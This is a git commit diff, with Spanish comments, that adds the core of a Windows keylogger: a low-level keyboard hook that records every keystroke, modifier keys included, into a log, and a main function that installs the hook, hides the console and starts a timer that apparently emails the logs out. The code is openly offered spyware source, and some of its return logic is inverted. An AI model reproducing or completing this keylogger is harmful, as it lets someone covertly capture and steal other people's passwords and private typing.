018ab39f78e82814b2c54116a6f5dc1149ef67cb
Andrés Herranz <andresherranz999@gmail.com>
2017-05-20 18:34:59 +0200

    Code finished. Timer.h Start() fyunction has a problem

--- Keylogger/KeybHook.h
+++ Keylogger/KeybHook.h
@@ -37,6 +37,63 @@ Timer MailTimer(TimerSendMail, 2000 * 60, Timer::Infinite);
 
 HHOOK eHook = NULL;
 
+/*Se llama a esta función simpre que el usuario pulsa una tecla*/
+LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam) {
 
+	if (nCode < 0)
+		CallNextHookEx(eHook, nCode, wparam, lparam);
+
+	/*con la división entre apretar el boton y soltar el botón, podemos distinguir, por ejemplo, 
+	las mayúsculas, ya que toco lo que pulse mientras está SHIFT pulsado, hasta que suelte el SHIFT, 
+	serán mayúsculas*/
+	/*Por ejemplo: [SHIFT][r][/SHIFT][o][o][t]
+	el usuario habría escrito Root, la primera mayúscula*/
+	KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;
+	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) {
+		keylog += Keys::KEYS[kbs->vkCode].Name;
+		if (kbs->vkCode == VK_RETURN)
+			keylog += '\n';
+	}
+	else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP) {
+		DWORD key = kbs->vkCode;
+		if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL ||
+			key == VK_SHIFT || key == VK_RSHIFT || key == VK_LSHIFT ||
+			key == VK_MENU || key == VK_RMENU || key == VK_LMENU ||
+			key == VK_CAPITAL || key == VK_NUMLOCK ||
+			key == VK_LWIN || key == VK_RWIN) {
+
+			std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
+			KeyName.insert(1, "/");
+			keylog += KeyName;
+		}
+	}
+
+	return CallNextHookEx(eHook, nCode, wparam, lparam);
+}
+
+/*Instala el Keylogger para que empiece a capturar las pulsaciones*/
+bool InstallHook() {
+
+	Helper::WriteAppLog("Hook Started... Timer started");
+	MailTimer.Start(true);
+
+	eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle(NULL), 0);
+
+	return eHook == NULL;
+}
+
+/*Desinstala el keylogger*/
+bool UninstallHook() {
+
+	BOOL b = UnhookWindowsHookEx(eHook);
+	eHook = NULL;
+
+	return(bool)b;
+}
+
+bool IsHoocked() {
+
+	return (bool)(eHook == NULL);
+}
 
 #endif // !KeybHook_h
--- Keylogger/main.cpp
+++ Keylogger/main.cpp
@@ -7,16 +7,23 @@
 #include "IO.h"
 #include "Timer.h"
 #include "SendMail.h"
+#include "KeybHook.h"
 
 using namespace std;
 
 int main() {
 	MSG  Msg;
 
+	IO::MkDir(IO::GetOurPath(true));
+	InstallHook();
+
 	//Hace que nuestra consola sea invisible
 	while (GetMessage(&Msg, NULL, 0, 0)) {
 		TranslateMessage(&Msg);
 		DispatchMessage(&Msg);
 	}
+	
+	MailTimer.Stop();
+
 	return 0;
 }
